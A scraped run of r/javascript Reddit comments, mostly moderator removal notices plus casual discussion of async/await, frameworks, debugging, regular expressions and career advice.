Hi /u/seemegonzie, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/pxl_vendara, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/aloisnoob39, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/rook2004, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/Nadjai99, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/GullibleAd0, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/Brinstakilla, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/cheese_bread_boye, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/chroner, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/fpuen, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/throwies11, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Logic is maths
I definitely keep away from writing comments that are easily inferred from the code, but I see how my comment indicated that. Sorry for the miscommunication!
Woof, that's a tough one. I'd probably start by modularizing that file and try to break up some of that into more reasonable pieces. If that's not possible, trial by fire it is!
Okay, thanks for feedback!
Hi /u/Jeffylew77, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Oh noes. Someone probably misunderstood "hands down" and downvoted the video...
very nice one, thanks
aka: Why a standard feature of all programming languages proved to be a huge pain in the ass for developers because our users couldn't be bothered with installers anymore :(
Hmmm, with gatsby becoming the king with theming and all other things, what would be the point that make us consider a new comers?
You probably didn't start from Angular when it was a concept but that framework was abandoned when they realize it sucked and made a new version of it. So everything you knew about Angular 1 you had to relearn for the new version. And then came Angular 4 and it broke things again so users from Angular 2 had to relearn (not that much) some new concept and libraries that they changed yet again.
Haha I see you point. But lime you said, if you want to keep your job you will have to suck it up and learn it
Presidential? Or tweets from the president?
So many ‚Äúdodoos‚Äù to ‚Äúpoop‚Äù out!
Dart will be the native language yes. I think they plan to abandoned Java in favor to Dart? Which is a great idea.
You will be able to use a variety of languages with Fuchsia. We have the Rust bindings for example already. With FIDL it is pretty easy to add addittional languages. https://fuchsia-docs.firebaseapp.com/rust/fidl/index.html But for GUI code it is Dart.
Yeoman. I think jhipster is based on Yeoman
Yeoman is where people create generators. Jhipster happens to be one of the most popular (if not THE most popular) generators. I haven't yet found a Yeoman generator that can do what Jhipster does with a node backend
That would entirely depend on your application, no? (e.g. Cloud, Serverless, Docker, VPS)
Why are you combining async await with traditional promise handling? I feel like you should go all in on async await or avoid it entirely
Hi /u/dennismphil, this submission was removed because you used a URL shortener. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
I read the guidelines and it was unclear whether this post fit or not. This is about JS, specifically, so ‚Äúgeneral web dev‚Äù and ‚Äúframework/library‚Äù didn‚Äôt seem to apply. The context is professional developers, so I‚Äôm not looking for beginner content. ‚ÄúHelp with JavaScript‚Äù sounds like help with the language itself or with a specific code snippet so I wasn‚Äôt sure if that applied. I‚Äôll try r/LearnJavaScript, but clarifying the rules could help first time posters here.
How many presentations on javascript bundlers/module system have you seen? ##
I working on a new "mailto" approach, its name is mailgo. Here the repo: [https://github.com/manzinello/mailgo](https://github.com/manzinello/mailgo) (a star if you like it!) demo: [https://mailgo.js.org](https://mailgo.js.org/)
In Vegas, when more people place bets on Team X, the odds shift in favor Team Y, to counter balance the bias. The job market is a market, and markets balance themselves via supply and demand. If the majority of impressionable newcomer do what the statistics say, and learn Technology X, the kid who learns Technology Y is going to be a valuable unicorn who gets offered every single one of the few jobs that use it. Bucking the trends is the secret path to job security, kids.
&gt;Presidential Specifically the Brazilian one.
``` $ hail node 12 --experimental-modules -bash: hail: command not found $ brew install hail Error: No available formula with the name "hail" ==&gt; Searching for a previously deleted formula (in the last month)... Error: No previously deleted formula found. ==&gt; Searching for similarly named formulae... Error: No similarly named formulae found. ==&gt; Searching taps... ==&gt; Searching taps on GitHub... Error: No formulae found in taps. $ ``` Well I tried.
But why not hexo ?
I made an emoji dictionary with svelte: [https://twitter.com/combatfetus/status/1126159510253342720](https://twitter.com/combatfetus/status/1126159510253342720)
In a single isolated instance, if you had to bet who would win a sports game, Team X or Team Y, and Team X had better statistics, you would be smart to bet on Team X. In Vegas, where they take all the bets people want to make, they understand that, and balance the bias out with odds. A Team X bet pays out a lower percentage than a Team Y bet. When people than expected bet more on Team X, they change the odds to pay out even more for a Team Y win. Business markets also behave similarly, though in a decentralized way. It is sort of a collective force of individual motivations. Supply and demand says when a commodity is scarce, you raise the price, because you can get it. When a store is overstocked, they throw a sale. The job market is no different. It is not a static graph, it is a dynamic system that reacts selfishly to external changes. If all the impressionable newcomers nervously choose the safe bet, and learned popular Technology X, since it is in high demand, the workforce fills up with Tech X developers. Companies who use it start to get piles of resumes when they post a job. It becomes the employers market. They don‚Äôt need to compensate well anymore. They don‚Äôt care if you don‚Äôt like your job. There is a line of desperate replacements. The point being that the simplistic idea that choosing the trending popular technology is the best path to success ignores every single moving part of the terrible toil machine. Doing so is damn near moronic. I do not know exactly how best to game the system, but I have more or less made a living by choosing technologies I like, and if I am bucking the trends, I get a glint of strategic joy from it. There are less openings, but I get more, better offers, and I like what I am doing, because I chose it that way.
Be careful blanket following the HSTS advice if your domain is used for many purposes, specifically if there are subdomains pointing to resources you don't control or otherwise intimately understand. See the recent discssion on HN for more detail: [https://news.ycombinator.com/item?id=19856419](https://news.ycombinator.com/item?id=19856419) (currently in the top few comments, by LeonM, nolok, et. al.)
While appreciate trying to be different, that website is kind of graphically annoying. The emboss effect on the text especially.
A good rule of thumb is to never mark a function as async, unless you're using await inside of it. A function that returns a promise is async by default.
Awesome. I like Dart and was thinking of picking it up.
be pleasant to work with and try your best
And say early if you're struggling or blocked, don't just expect you'll be able to catch up by trying harder - you're already trying hard. Getting stuck/behind schedule happens to everyone and is far easier to deal with if it is known in advance.
Loved it! Thx for sharing
first of all, it's using Vue.js, so it will.be your choice if you prefer Vue.js Secondly, I assume that Hexo was (once?) more popular than GatsbyüòÖ Saber is like Hexo in terms of learning curve, it's easy to learn for people with basic Node.js knowledge.
I would say there's probably between 10-20 of these on the web. It's just such a hard topic to present over since that part of JS history happened so fast. Either you were in the middle of it and understood what was going on, or you looked at it like a black box(magic) and never looked back. Most talks I've seen either go over the module systems at a high level or authors talking about their bundler tool. Prior to seeing this presentation, this [https://youtu.be/Jgp-RAVsSAw](https://youtu.be/Jgp-RAVsSAw) had been the best module system presentation I'd seen. It was a great presentation, it just didn't have the same effect on me as this one. After I finished watching Luciano's video, I was like, "Damn I completely understand how this shit works now." &amp;#x200B; Pro tip on how to find gem videos: Clone repo of popular library -&gt; Scroll down to first commit -&gt; Get original author's name -&gt; Google name -&gt; Hit "Videos" tab
&gt; what evidence? The evidence I gave yesterday when someone else asked. . &gt; the brush needed to paint that broad of a stroke must be enormous Nope.
It's entirely possible for you to get an entry level position. I did basically the same thing after 6 years of teaching Your 3D experience won't count for much of anything at most companies, though.
Project Page (?): https://github.com/oguzeroglu/ROYGBIV *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Hi /u/python_mainly, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Thanks for the info. What subject(s) where you teaching? Was it something related to programming?
I wrote a [module](https://github.com/cmseaton42/task-easy) that allows you to stack async functions and execute then in sequence.
I taught middle school Sped and elementary school, and never once mentioned programming. I learned to code after I left the profession.
That's very encouraging! What programming language(s) did you learn? Did you need to create some sort of portfolio?
Javascript and a dash of C#. I didn't create a portfolio, though. I just kept applying to places until someone gave me a shot. It took hundreds of applications.
Can you show an example of what you mean by this? I don't use ` `Symbol.iterator`.
Right on. That give me hope!!! If you know of any good resources available for practicing JS that would be very helpful :)
i really appreciate Saber and everything you do for the open-source community, egoist!
Hackerrank and Codecademy are both solid. Angular and React both have good tutorial projects on their websites. Pluralsight has some amazing courses, if you're willing to pay.
Awesome! Thank you very much for all the helpful info!!
I would also consider leveraging some of your existing experience and learning Augmented Reality/VR with something like Hololens 2 or Oculus. I just went to the Microsoft Mixed Reality Dev Days conference and I can tell you that the market for that is going to be big for medical, education, industry, IoT, and entertainment. You definitely need some 3d skills for this. Most often development is in something like Unity but there is also a growing trend to use tools like three.js or Babylon.js to do 3d on the web. It's pretty easy to import 3d models you make in say blender and convert them to gltf. Anyways, consider learning this side of development too.
My pleasure. Good luck!
The new default WordPress editor experience is all React-based and you can create your own front end using the REST API. So... the headline doesn't sound very interesting.
Hi /u/BeneficialYam4, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Thanks for the advice. I've messed with three.js and Babylon.js but I don't think my understanding of JavaScript was good enough to really leverage it. I spend the last 5 months adding more content to my 3D portfolio. Now I'm hoping the rest of the year can be focused on coding in my free time.
www.github.com/damorntyde/list... Have fun i guess...
make "stringToSearchFor" uni-case (it doesn't matter which) and convert "this.getPageNthWord(p, n)" to the appropriate case before the comparison
Use RegExp with the i flag.
Is it supposed to be extremely blurry?
Nice assumption, very wrong as well. I was referring to the "10".
I love how this guy says jGuiri. Amazing talk!
Hi /u/highres90, this submission was removed because you used a URL shortener. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Because it alienates everyone who doesn't use Win10? Sure, it might make business sense for Microsoft, but at the cost of the non-10 userbase.
I'm not a node dev, done some small express gigs, and gotta say that debugging was so easy that I kind of wish there were more people using node in my area
thanks!
&gt; Simply copy/pasting the example from this article will completely break subdomains that are not HTTPS enabled Uh... Good?
&gt; A good rule of thumb is to never mark a function as async, unless you're using await inside of it. eslint rule require-await &gt; A function that returns a promise is async by default. Every async function returns a promise, maybe that's what you mean. async function f() { await console.log(1); } console.log(f()); //=&gt; Promise { &lt;pending&gt; }
You can't run awaits concurrently.
React is not an alternative to wordpress. That makes no sense
To note: you should be able to find all information you need for free. Only pay for information if it's something like a class in Udemy / Lynda. If you want a profile or portfolio, make a github account and keep all your projects there (except maybe your Hello World's :) )
I like the look of the website, however I'm sad the code areas arent wide enough for my little 11 chromebook. There are so many functions there are marked async for no reason. Its not hurting anything, but it triggers my eslint. The first example is weird because you are not conventionally returning a constructed promise from a 'promise factory function' but you are chaining a then which is only used for formatting. Kinda tricky for a tutorial. I think this is more tutorial function asyncTimeout(delay) { return new Promise((resolve) =&gt; { setTimeout(() =&gt; resolve(`Waited ${delay} seconds`), delay); }); }
Thanks, I think this is a good route to go. I have been reading about RegExp and cannot get it to return results. Do you recommend a source that is straightforward for how to get it to work? I have been on [w3schools.com](https://w3schools.com) for the last hour looking at examples and tinkering. I think trying to use app.response with it is the problem but would hate to have to edit the code for each new term I search. This is what I changed it to: var str = app.response("Enter search term") var x = str.search(/app.response/i); for (var p = 0; p &lt; this.numPages; p++) { // iterate over all words for (var n = 0; n &lt; this.getPageNumWords(p); n++) { if (this.getPageNthWord(p, n) == x) { pageArray.push(p); break; } If this is getting too muddy no worries. I have finals next week and a 3,500 page PDF to study (in medical school) - was trying to use this script to cut down on the amount of information I need to read. I will have more time in the summer to dive into this stuff.
üòÇ
Neither of those is what I meant. A function shouldnt be async unless you *need* to await something inside. And a function that returns a promise, and doesn't await anything, should not use the \`async\` keyword.
Thanks for the suggestion. I tried the RegExp with i flag route first because it seemed simpler. I will look more into this solution after my exams are over next week.
Reading articles the fun way with Incognito mode because Medium sucks
You can export your 3d models to web and build stunning websites, look for three.js and learn Javascript properly.
&gt; A function shouldnt be async unless you need to await something inside. Sorry I wasn't being clear. You are right, I was just bloviating about how I use eslint to catch my goofs of using async without await.
This is amazing. Now I don't have to basically support ie11 (basically the same thing as the previous Google bot) just for the sake of SEO!
Improve your javascript skills and you're gonna be a god in a game company that works with web projects. You'd also be valuable at big digital agencies.
We're at the golden age of web tools as well: [three.js](https://threejs.org/), [Babylon.js](https://www.babylonjs.com/), [Unity](https://unity.com/)‚Ä¶
haha thanks! I would like to try making some classic arcade like game as a web app.
You can do something like: const [result1, result2] = await Promise.all([func1(), func2()]);
big if true
Oh ok, I thought you meant no mention of "promise" at all in async functions. as in Promise.all([func1(), func2()]);
Also: here's one of my favorite features of VSCode: Start the node process up with the inspector on: ``` node --inspect-brk my-node-script.js # or for TypeScript: node --inspect-brk -r ts-node/register my-node-script.ts ``` Then execute the following command in VSCode: "Debug: Attach to Node Process" =&gt; this will open up a process chooser of processes that VSCode has detected are running the inspector. Debug away! One note: `--inspect-brk` starts the process up in a "paused" state, waiting for an external debugger to tell it to continue: if you want to just leave a process running, but ready to be connected to via debugger, use the `--inspect` flag instead!
The comments here really make me feel so much better about where I‚Äôm at. Glad to I‚Äôm not the only one who thinks know stuff like webpack is confusing black magic. Lmao. Idk where I would be without create-react-app, or the various boilerplate projects on github.
But do we have other alternatives?
These days a lot of the jQuery functionality has nice native JS replacements. So it is often unnecessary and honestly I actually have a hard time reading it now. The fetch api is the one you want for this problem. [https://developer.mozilla.org/en-US/docs/Web/API/Fetch\_API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) But before you use it. I strongly suggest you test your web api end point call using Postman. This will ensure the api actually works before you try to get the JS part working. [https://www.getpostman.com/](https://www.getpostman.com/) Since your goal seems to be learning learning to use both will be an excellent exercise IMO because both tools are incredibly useful.
And you didn't hear me saying "scenario" and "scaffolding"... Trust me, my native English speaking colleagues are still laughing üòã
When it comes to JS, Dont ever feel bad for not knowing something. 95% of JS developers say they know something, but only 5% can actually explain it.